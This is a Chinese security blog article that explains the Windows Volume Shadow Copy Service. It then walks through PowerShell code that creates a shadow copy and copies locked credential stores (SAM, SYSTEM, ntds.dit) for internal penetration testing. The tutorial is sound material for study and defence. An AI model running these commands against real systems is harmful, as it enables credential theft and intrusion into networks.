<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/KTl0qYU12WbsLfT9JyoZyQ)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

免责声明

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

VSS 服务简介

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

Volume Shadow Copy Service（卷影复制服务，是 Microsoft Windows 中的一项功能，用于创建文件或卷的备份（快照）。VSS 允许备份程序和其他类似服务在不中断文件使用的情况下创建这些备份。  

快照技术允许在一瞬间捕获文件系统的精确状态，然后即使文件系统继续改变，备份仍然可以基于该快照进行，确保备份数据的一致性。VSS 对系统管理员和备份软件都很有用，因为它可以确保即使文件正在使用中，也能创建出可靠的备份。

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

VSS 服务工作流程

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

*   快照创建：VSS 能够创建一个或多个卷（如硬盘驱动器）上文件和文件夹的快照，这些快照称为影像副本或卷影副本。会捕获创建快照时刻的数据状态，允许用户或备份应用程序能够查看那一时刻的文件版本。
    
*   文件系统一致性：在创建快照的过程中，VSS 确保文件系统的一致性。对于事务性文件系统（如 NTFS），这确保文件系统在创建备份时不会处于正在写入的中间状态。
    
*   运行中的应用一致性：VSS 与其他应用程序（如数据库管理系统）协同工作，确保在创建快照时，相关数据在逻辑上是一致的。这对于需要确保数据原子性和完整性的应用尤其重要，例如数据库和电子邮件服务器。
    
*   最小化服务中断：VSS 允许用户在文件备份过程中继续使用系统，减少系统中断和服务停机时间。
    
*   卷影副本管理：VSS 管理创建的影像副本，包括跟踪哪些卷有活动的副本和它们所用的存储资源。
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9AnibWLLRfQ3gBhzsHRx9wk8kNSG2GbaJ5JicIzYuiaibFdic2PibxWNJTibggDVv1Jg4ezeOZGZbic6wNxGw/640?wx_fmt=png&from=appmsg)

由以下主要组件构成：

*   VSS 服务：它是整个 VSS 架构的协调者，负责管理所有 VSS 操作。
    
*   VSS 请求者：通常是备份应用程序，它请求创建卷影副本。
    
*   VSS 提供者：创建并管理卷阴影副本的底层系统或硬件组件。它可以是系统软件，也可以是硬件。
    
*   VSS 编写器：它是一种特殊的应用程序或服务，它保证在创建卷影副本时，应用程序的数据在一致和稳定的状态。
    

创建快照的过程如下：

*   VSS 请求者（通常是备份软件）发起快照请求。
    
*   VSS 服务协调 VSS 编写器准备数据（例如，完成事务，刷新缓冲区等）。
    
*   VSS 提供者创建影像副本。
    

影像副本创建完毕后，VSS 请求者可以从这个副本中备份数据，而系统可以继续正常工作。

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

卷影副本

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

卷影副本（Shadow Copy）是 Windows 操作系统中的一种技术，它可以创建文件或磁盘卷的精确点时间副本，即使在文件正在被使用时也不例外。这种技术通常被用于备份服务中，以确保在备份过程中能够捕获一致且不被改变的数据快照。卷影副本是通过 Volume Shadow Copy Service (VSS) 实现的。

创建卷影副本一般分为以下几个步骤：

*   VSS 请求者（如备份软件）请求创建一个卷影副本。
    
*   VSS 与各个 VSS 编写器（可能是文件系统驱动或者其他服务，如数据库服务）通信，记录当前运行状态，然后准备数据的一致性快照。
    
*   VSS 提供者创建卷影副本，并将副本的引用提供给 VSS 请求者。
    
*   备份可以从副本中进行而不影响现有的用户活动和文件操作。
    

使用卷影副本可以最小化备份和恢复活动对用户和系统的干扰，这对企业环境中的数据完整性和可用性至关重要。

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

为什么使用 VSS 服务复制而不是直接复制？

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

因为大多数我们感兴趣的文件都是锁定的，无法直接复制，而且如果文件状态一直更改，即使能够复制也无法保证文件完整性。  

以 SAM 文件为例，我们进入 SAM 文件目录：

```
C:\Windows\System32\config\

```

尝试复制文件后随便找个地方粘贴，会提示文件正在使用：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9AnibWLLRfQ3gBhzsHRx9wk8GJokfHBOMrhjjgKgIGQeeic68gj9JTbxDgwcVeJeamY51osQfVUUEtQ/640?wx_fmt=png&from=appmsg)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

通过 PowerShell 操作 VSS 复制文件

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

1.  首先可以通过 Get-Service 检查 VSS：  
    

```
Get-Service -Name VSS

```

```
Get-Service -Name VSS | Select-Object Status

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9AnibWLLRfQ3gBhzsHRx9wk8icNzzf2cNOAawYKcjibk7SwIZvIGBO54vL0iaoorTvopPJAgEa7QWtH6A/640?wx_fmt=png&from=appmsg)

2. 然后可以写一个判断确定 VSS 是否开，如果没打开则将其启动：

```
$service = Get-Service -Name VSS
if ($service.Status -ne 'Running') {
    Start-Service -Name VSS
    "VSS service has been started."
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9AnibWLLRfQ3gBhzsHRx9wk8wqzDlNxudoaqic1r0yF6ln5So5Hzw8IZSExXPhtuXTH0jhga6VT7o7Q/640?wx_fmt=png&from=appmsg)

3. 然后开始复制文件，这里我们复制比较重要的 SAM 文件、SYSTEM 文件以及 ntds.dit 文件，首先我们需要创建一个新的卷影副本：

```
# Create a new volume shadow copy
$shadow = (Get-WmiObject -List win32_shadowcopy).Create('C:\', 'ClientAccessible')
$volume = Get-WmiObject win32_shadowcopy | Where-Object { $_.ID -eq $shadow.ShadowID }
$deviceObject = $volume.DeviceObject + "\"

```

解释一下这段代码：

```
$shadow = (Get-WmiObject -List win32_shadowcopy).Create('C:\', 'ClientAccessible')

```

*   Get-WmiObject -List win32_shadowcopy: 这个命令查询系统支持的 WMI（Windows Management Instrumentation）对象，并列出可以管理卷影副本的类 win32_shadowcopy。
    
*   .Create('C:\', 'ClientAccessible'): 通过调用 win32_shadowcopy 类的 Create 方法来创建卷 C:\ 的卷影副本。'ClientAccessible'参数确保创建的卷影副本能够被客户端访问。创建操作会返回一个包含操作状态和新创建的卷影副本 ID 的对象。
    

```
$volume = Get-WmiObject win32_shadowcopy | Where-Object { $_.ID -eq $shadow.ShadowID }

```

*   Get-WmiObject win32_shadowcopy: 获取当前系统上的所有卷影副本的实例。
    
*   Where-Object {$_.ID -eq $shadow.ShadowID}: 筛选出前面创建的卷影副本的实例，通过比较每个实例的 ID 属性和 $shadow.ShadowID 是否相等，确保变量 $volume 存储的是刚刚创建的卷影副本的实例。
    

```
$deviceObject = $volume.DeviceObject + "\"

```

*   $volume.DeviceObject: 提取关于卷影副本的设备对象属性，它提供了卷影副本的根目录的访问路径。
    
*   + "\": 在路径末尾添加反斜杠（\），这是路径的标准格式，确保后面连接的文件路径是正确的。
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9AnibWLLRfQ3gBhzsHRx9wk8JNPQJEVdicwDanuYcPPwBiaxDUuM3EMA7jyDNSWHYKbGr3rPZYZCzRtA/640?wx_fmt=png&from=appmsg)

4. 然后就可以愉快的从副本中复制文件了，不要忘了把副本删除：

```
# Copy the files
foreach ($file in $FileList) {
    $filename = Split-Path $file -Leaf
    $relPath = $file.Substring(3)
    $srcPath = "$deviceObject\$relPath"
    $destPath = Join-Path -Path $TargetDirectory -ChildPath $filename
    # We use cmd.exe to perform copy to overcome the limitation with certain special paths
    cmd /c copy "$srcPath" "$destPath"
    Write-Host "Copied to: $destPath"
}
# Delete the shadow copy to free up the space
$volume.Delete()

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9AnibWLLRfQ3gBhzsHRx9wk8fic0SLqW07CyjicEYLm1wdyyNVXKTh2e2jkP0apkKwImYWibelneu4koA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9AnibWLLRfQ3gBhzsHRx9wk8YiazI7GZKFCl8oJiamctq1BpesIFReia4CJApw7NnTwuCuDPWkZDccRTA/640?wx_fmt=png&from=appmsg)

5. 最后关闭 VSS 服务 (如果一开始没有打开)：

```
Stop-Service -Name VSS

```

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

总结

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

本文介绍了 Windows 系统下的 VSS 服务，以及如何利用 VSS 服务复制系统文件 (系统文件通常是不能直接复制的)。在内网渗透中，获得系统文件的信息至关重要。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9B7vZdL5TFiaHdDq5o1RLL1ja6dE33eaySFgeGz1d7As5DibPIUNnwgx7eKPcVEz8FwFTB1ygqOdgbg/640?wx_fmt=png&from=appmsg)